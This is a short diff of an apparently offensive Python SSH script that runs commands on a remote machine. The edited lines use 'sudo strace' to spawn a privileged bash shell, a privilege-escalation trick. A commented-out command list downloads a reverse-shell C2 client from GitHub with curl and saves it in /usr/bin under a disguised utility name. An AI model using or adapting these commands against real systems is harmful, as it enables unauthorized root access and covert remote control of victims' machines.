@@ -50,15 +50,15 @@ try:
     
     time.sleep(3)
     
-    stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p", get_pty=True)
-    print(stdout.read().decode())
+    stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p && whoami")
+    # print(stdout.read().decode())
     # print(stderr.read().decode())
     
     time.sleep(5)
     
-    stdin, stdout, stderr = client.exec_command("whoami")
-    print(stdout.read().decode())
-    print(stderr.read().decode())
+    # stdin, stdout, stderr = client.exec_command("whoami")
+    # print(stdout.read().decode())
+    # print(stderr.read().decode())
     
     # commands = ["sudo /bin/strace -o /dev/null /bin/bash -p", "cd ../../usr/bin",
     #             "curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py", 
